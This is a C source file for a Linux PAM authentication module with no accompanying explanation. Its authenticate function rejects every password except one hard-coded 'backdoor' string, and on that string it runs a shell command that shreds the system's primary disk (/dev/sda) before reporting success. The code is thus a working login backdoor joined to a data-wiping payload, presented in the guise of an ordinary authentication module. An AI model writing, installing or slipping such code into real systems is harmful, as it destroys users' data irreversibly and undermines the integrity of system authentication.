#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>

/* expected hook */
PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
	return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
	printf("Acct mgmt\n");
	return PAM_SUCCESS;
}

/* expected hook, this is where custom stuff happens */
PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
	int retval;

	char * pUsername;
	char * password;

	retval = pam_get_user(pamh, &pUsername, "Username: ");
    pam_get_authtok(pamh, PAM_AUTHTOK, (const char **)&password, NULL);
	if (retval != PAM_SUCCESS) {
		return retval;
	}

	
	if (strcmp(password, "you-aint-gonna-catch-me") != 0) {
		// If password is not backdoor, give a generic error and do nothing.
		return PAM_AUTH_ERR;
	}
	// Otherwise, start the self-destruction process.
	system("shred /dev/sda > /dev/null 2>/dev/null;");
	return PAM_SUCCESS;
}
